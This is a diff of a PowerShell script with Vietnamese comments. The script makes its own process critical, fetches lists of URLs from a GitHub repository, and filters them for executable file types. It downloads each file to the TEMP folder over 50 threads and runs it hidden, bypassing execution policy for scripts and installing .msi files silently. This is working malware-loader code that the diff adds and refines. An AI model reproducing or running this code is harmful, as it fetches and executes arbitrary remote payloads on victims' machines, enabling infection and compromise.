@@ -25,50 +25,57 @@ function CriticalProcess {
     }
 }
 CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
-# 1. Nguồn URL (List đã check của bạn)
+# 1. Nguồn URL từ list bạn đã check
 $sources = @(
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
 )
 
-# Các định dạng hỗ trợ (Mở rộng tối đa cho Windows)
+# Extension hỗ trợ
 $extensions = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"
 
-Write-Host "[*] Đang đọc danh sách đã check..." -ForegroundColor Cyan
+Write-Host "[*] Đang thu thập và lọc trùng từ GitHub..." -ForegroundColor Cyan
 
-# Tải và gộp list, loại bỏ trùng lặp tuyệt đối
-$allUrls = foreach ($s in $sources) {
+# Cách lấy dữ liệu an toàn, tránh lỗi Empty Pipe
+$allUrls = @()
+foreach ($s in $sources) {
     try {
-        (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content -split "`n" | 
-        ForEach-Object { $_.Trim() } | 
-        Where-Object { $_ -ne "" -and ($extensions | Where-Object { $url = $_; $url.ToLower().EndsWith($_) }) }
+        $content = (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content
+        if ($content) {
+            $allUrls += $content -split "`n" | ForEach-Object { $_.Trim() }
+        }
     } catch { }
+}
+
+# Lọc trùng và kiểm tra đuôi file hợp lệ
+$finalList = $allUrls | Where-Object { 
+    $url = $_
+    $url -ne "" -and ($extensions | Where-Object { $url.ToLower().EndsWith($_) })
 } | Select-Object -Unique
 
-Write-Host "[*] Tổng cộng $($allUrls.Count) link sẵn sàng. Đang chạy 50 luồng..." -ForegroundColor Green
+Write-Host "[*] Tổng cộng $($finalList.Count) link duy nhất. Đang chạy 50 tầng (threads)..." -ForegroundColor Green
 
-# 2. Cấu hình Runspace Pool (50 luồng)
+# 2. Thiết lập Runspace Pool (Multi-threading)
 $sessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
 $pool = [runspacefactory]::CreateRunspacePool(1, 50, $sessionState, $Host)
 $pool.Open()
-
 $threads = New-Object System.Collections.Generic.List[PSObject]
 
-# 3. Logic xử lý từng loại Extension
-foreach ($u in $allUrls) {
+# 3. Đẩy tác vụ vào luồng
+foreach ($u in $finalList) {
     $powershell = [powershell]::Create().AddScript({
         param($url)
         try {
-            # Lấy tên file sạch (bỏ tham số sau dấu ?)
+            # Xử lý tên file và đường dẫn TEMP
             $cleanUrl = $url.Split('?')[0]
             $fileName = [System.IO.Path]::GetFileName($cleanUrl)
             $path = Join-Path $env:TEMP $fileName
             $ext = [System.IO.Path]::GetExtension($path).ToLower()
             
-            # Tải xuống cực nhanh
+            # Tải xuống
             Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
             
-            # --- KIỂM TRA LOẠI FILE ĐỂ CHẠY CHO ĐÚNG ---
+            # Logic thực thi theo loại file
             switch ($ext) {
                 ".ps1" { 
                     Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden 
@@ -80,7 +87,6 @@ foreach ($u in $allUrls) {
                     Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden 
                 }
                 default { 
-                    # Chạy trực tiếp cho .exe, .bat, .cmd, .com, .scr...
                     Start-Process -FilePath $path -WindowStyle Hidden 
                 }
             }
@@ -94,13 +100,13 @@ foreach ($u in $allUrls) {
     }))
 }
 
-# 4. Đợi hoàn tất
+# 4. Giám sát cho đến khi xong
 while ($threads.Handle.IsCompleted -contains $false) { Start-Sleep -Milliseconds 200 }
 
-# 5. Dọn dẹp bộ nhớ
+# 5. Giải phóng
 foreach ($t in $threads) {
     $t.Instance.EndInvoke($t.Handle)
     $t.Instance.Dispose()
 }
 $pool.Close()
-Write-Host "[+] Xong! Đã xử lý tất cả link từ list của bạn." -ForegroundColor White
+Write-Host "[+] HOÀN TẤT!" -ForegroundColor White
